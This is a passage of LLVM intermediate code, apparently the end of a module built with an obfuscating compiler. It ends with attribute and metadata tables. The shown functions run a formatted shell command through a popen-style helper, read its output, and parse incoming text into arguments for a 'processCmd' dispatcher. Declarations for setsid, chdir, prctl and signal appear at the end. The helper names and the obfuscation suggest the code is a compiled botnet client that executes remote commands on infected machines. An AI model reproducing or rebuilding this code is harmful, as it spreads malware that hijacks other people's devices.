  %138 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %137, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.124, i64 0, i64 0), i8* %121)
  %139 = call i32 @fdpopen(i8* nonnull %137, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.125, i64 0, i64 0))
  %140 = call i8* @fdgets(i8* nonnull %137, i32 1024, i32 %139)
  %141 = icmp eq i8* %140, null
  br i1 %141, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %136
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  call void @trim(i8* nonnull %137)
  call void @llvm.memset.p0i8.i64(i8* nonnull %137, i8 0, i64 1024, i32 16, i1 false)
  %142 = call i32 @sleep(i32 1) #3
  %143 = call i8* @fdgets(i8* nonnull %137, i32 1024, i32 %139)
  %144 = icmp eq i8* %143, null
  br i1 %144, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %136
  %145 = call i32 @fdpclose(i32 %139)
  call void @exit(i32 0) #17
  unreachable

; <label>:146:                                    ; preds = %._crit_edge105
  %147 = call i8* @strtok(i8* %121, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.126, i64 0, i64 0)) #3
  store i8* %110, i8** %36, align 16
  %148 = icmp eq i8* %147, null
  br i1 %148, label %._crit_edge110.thread, label %.lr.ph109.preheader

.lr.ph109.preheader:                              ; preds = %146
  br label %.lr.ph109

._crit_edge110.thread:                            ; preds = %146
  call void @processCmd(i32 1, i8** nonnull %36)
  br label %.backedge

.lr.ph109:                                        ; preds = %.lr.ph109.preheader, %161
  %.065107 = phi i8* [ %162, %161 ], [ %147, %.lr.ph109.preheader ]
  %.066106 = phi i32 [ %.1, %161 ], [ 1, %.lr.ph109.preheader ]
  %149 = load i8, i8* %.065107, align 1
  %150 = icmp eq i8 %149, 10
  br i1 %150, label %161, label %151

; <label>:151:                                    ; preds = %.lr.ph109
  %152 = call i64 @strlen(i8* nonnull %.065107) #15
  %153 = add i64 %152, 1
  %154 = call noalias i8* @malloc(i64 %153) #3
  %155 = sext i32 %.066106 to i64
  %156 = getelementptr inbounds [10 x i8*], [10 x i8*]* %6, i64 0, i64 %155
  store i8* %154, i8** %156, align 8
  %157 = call i64 @strlen(i8* nonnull %.065107) #15
  %158 = add i64 %157, 1
  call void @llvm.memset.p0i8.i64(i8* %154, i8 0, i64 %158, i32 1, i1 false)
  %159 = call i8* @strcpy(i8* %154, i8* nonnull %.065107) #3
  %160 = add nsw i32 %.066106, 1
  br label %161

; <label>:161:                                    ; preds = %.lr.ph109, %151
  %.1 = phi i32 [ %160, %151 ], [ %.066106, %.lr.ph109 ]
  %162 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.126, i64 0, i64 0)) #3
  %163 = icmp eq i8* %162, null
  br i1 %163, label %._crit_edge110, label %.lr.ph109

._crit_edge110:                                   ; preds = %161
  call void @processCmd(i32 %.1, i8** nonnull %36)
  %164 = icmp sgt i32 %.1, 1
  br i1 %164, label %.lr.ph113.preheader, label %.backedge

.lr.ph113.preheader:                              ; preds = %._crit_edge110
  %wide.trip.count = zext i32 %.1 to i64
  br label %.lr.ph113

.lr.ph113:                                        ; preds = %.lr.ph113.preheader, %.lr.ph113
  %indvars.iv121 = phi i64 [ %indvars.iv.next122, %.lr.ph113 ], [ 1, %.lr.ph113.preheader ]
  %165 = getelementptr inbounds [10 x i8*], [10 x i8*]* %6, i64 0, i64 %indvars.iv121
  %166 = load i8*, i8** %165, align 8
  call void @free(i8* %166) #3
  %indvars.iv.next122 = add nuw nsw i64 %indvars.iv121, 1
  %exitcond = icmp eq i64 %indvars.iv.next122, %wide.trip.count
  br i1 %exitcond, label %.backedge.loopexit, label %.lr.ph113
}

; Function Attrs: nounwind
declare i32 @printf(i8* nocapture readonly, ...) local_unnamed_addr #5

declare i32 @prctl(...) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @setsid() local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @chdir(i8*) local_unnamed_addr #5

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) local_unnamed_addr #5

; Function Attrs: nounwind readonly
declare i32 @strncmp(i8* nocapture, i8* nocapture, i64) #15

; Function Attrs: nounwind
declare i32 @fputs(i8* nocapture readonly, %struct._IO_FILE* nocapture) #3

attributes #0 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind }
attributes #4 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { argmemonly nounwind }
attributes #7 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #11 = { noinline nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #12 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #13 = { noinline noreturn nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #14 = { noinline norecurse nounwind readnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #15 = { nounwind readonly }
attributes #16 = { nounwind returns_twice }
attributes #17 = { noreturn nounwind }
attributes #18 = { nounwind readnone }
attributes #19 = { cold }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = distinct !{!1, !2, !3}
!2 = !{!"llvm.loop.vectorize.width", i32 1}
!3 = !{!"llvm.loop.interleave.count", i32 1}
!4 = !{!5}
!5 = distinct !{!5, !6}
!6 = distinct !{!6, !"LVerDomain"}
!7 = !{!8}
!8 = distinct !{!8, !6}
!9 = distinct !{!9, !10}
!10 = !{!"llvm.loop.unroll.disable"}
!11 = distinct !{!11, !2, !3}
!12 = distinct !{!12, !2, !3}
!13 = !{i32 -2146482628}
!14 = !{i32 -2146481188}
!15 = !{i32 -2146480365}
!16 = distinct !{!16, !2, !3}
!17 = distinct !{!17, !18, !2, !3}
!18 = !{!"llvm.loop.unroll.runtime.disable"}
!19 = !{i32 -2146479443}
!20 = !{i32 -2146478060}
